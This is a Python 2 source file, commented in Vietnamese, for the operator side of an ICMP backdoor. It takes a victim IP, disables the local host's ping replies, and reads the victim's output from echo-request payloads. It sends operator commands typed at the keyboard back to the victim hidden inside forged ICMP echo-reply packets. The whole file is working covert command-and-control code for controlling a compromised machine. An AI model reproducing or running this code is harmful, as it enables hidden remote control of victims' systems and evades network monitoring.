# -*- coding: utf-8 -*-

"""
Trong phần này mình sẽ build phần icmp server
--------------------------ICMP Replay-------------------------------------------------|
[type of message]  8 bit                                                       |
[code]             8 bit                                                       |
[check sum]        16 bit                                                      |
[indentifier BE LE]    2 byte                                                  |
[Sequence number BE LE]2 byte                                                  |
[time sent request]    8 byte                                                  |
[payload data] optional 32 byte <maximun là 578 byte>                          |
-------------------------------------------------------------------------------|

Vậy phía server sẽ gởi  gói icmp replay
Đối với
"""
import argparse
import os, sys, socket, struct, select, time


ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLAY = 0


def setNonBlocking(fd):
    """
    Make a file descriptor non-blocking
    """

    import fcntl

    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)

def default_timer():
    return time.time()

def checksum(source_string):
    """
    tạo ra check sum cho icmp có độ dài 16 bit,
    Nói chung không cần quan tâm hàm này, nó mục đich để kiểm tra header và data,
    Không cần biết vì biết cũng cã làm gì, hihi
    """
    sum = 0
    countTo = (len(source_string) / 2) * 2
    count = 0
    while count < countTo:
        thisVal = ord(source_string[count + 1]) * 256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2

    if countTo < len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff

    answer = answer >> 8 | (answer << 8 & 0xff00)

    return answer

def receive_one_ping(my_socket, victim_ip):

    """
    nhận 1 ping từ socket
    """

    # Make standard input a non-blocking file
    stdin_fd = sys.stdin.fileno()
    setNonBlocking(stdin_fd)

    out = ""

    while True:

        cmd = ''

        # nhận gói echo request
        if my_socket in select.select([my_socket], [], [])[0]:
            buff_packet, addr = my_socket.recvfrom(4096)

            if 0 == len(buff_packet):
                my_socket.close()
                print "backdoor icmp chua bat"
                sys.exit(0)

            # check ping từ victim gởi

            if addr[0] == victim_ip:
                icmpHeader = buff_packet[20:28]
                type, code, checksum, identifier, sequence = struct.unpack(
                    "bbHHh", icmpHeader
                )

                if type == 8:
                    header_control = buff_packet[28]
                    data = buff_packet[29:]

                    # lấy gói header của server site
                    if header_control == "0":

                        # in ra mang hinh thông tin của victime
                        if len(data) > 0:
                            data = "%s============================================\n" %(data)
                            sys.stdout.write(data)
                            sys.stdout.flush()

                    # neu la goi respone co data in ra mang dinh
                    if header_control == "3":
                        if len(data) > 0:
                            sys.stdout.write(data)
                            sys.stdout.flush()

                     # neu la goi respone khong co data thi thi ko lam gi

                    # doc tu ban phim
                    try:
                        # neu co lenh thu thi byte
                        # byte 28 = 2
                        cmd = "2"+sys.stdin.readline()
                    except:
                        # khong co lenh thuc hien byte
                        # byte 28 = 1
                        cmd = "1slient"

                    if cmd == 'exit\n':
                        return

                    send_replay_ping(my_socket, victim_ip, identifier, sequence, cmd)

def send_replay_ping(my_socket, dest_addr, identifier, sequence, cmd):
    """
    gởi gói ping replay dựa trên gói request
    :param my_socket: 
    :param dest_addr: 
    :param identifier: 
    :param sequence: 
    :param cmd: 
    :return: 
    """

    dest_addr = socket.gethostbyname(dest_addr)

    # Header is type (8 bit), code (8 bit), checksum (16 bit), identifier (16 bit), sequence (16 bit)

    my_checksum = 0

    # Tạo check sum header vào gói replay
    header = struct.pack("bbHHh", ICMP_ECHO_REPLAY, 0, my_checksum, identifier, sequence)

    # nếu là gói ping bình thường sẽ set time vào data payload
    # data = struct.pack("d", default_timer())
    # gói này nhét command vào payload
    data = cmd

    # Tính toán checksum header và data
    my_checksum = checksum(header + data)

    # đóng gói lại header ICMP với checksum header
    header = struct.pack(
        "bbHHh", ICMP_ECHO_REPLAY, 0, socket.htons(my_checksum), identifier, sequence
    )


    # gới gói header + data
    my_socket.sendto(header + data, (dest_addr, 1))

def main(ip_victim):
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error, (errno, msg):
        if errno == 1:
            # permit denny
            msg = msg + (
                " - Note that ICMP messages can only be sent from processes"
                " running as root."
            )
            raise socket.error(msg)
        raise  # raise the original error

    # nhập gói request
    try:
        receive_one_ping(my_socket, ip_victim)
    except KeyboardInterrupt:
        print "exit"
        my_socket.close()
        sys.exit(1)

if __name__ == '__main__':

    parse = argparse.ArgumentParser()
    parse.add_argument("--victim", help="chọn ip victim", required=True)
    arg_input = parse.parse_args()

    # tắt icmp replay của OS
    os.system("sysctl -w net.ipv4.icmp_echo_ignore_all=1")
    try:
        main(arg_input.victim)
    except KeyboardInterrupt:
        os.system("sysctl -w net.ipv4.icmp_echo_ignore_all=0")

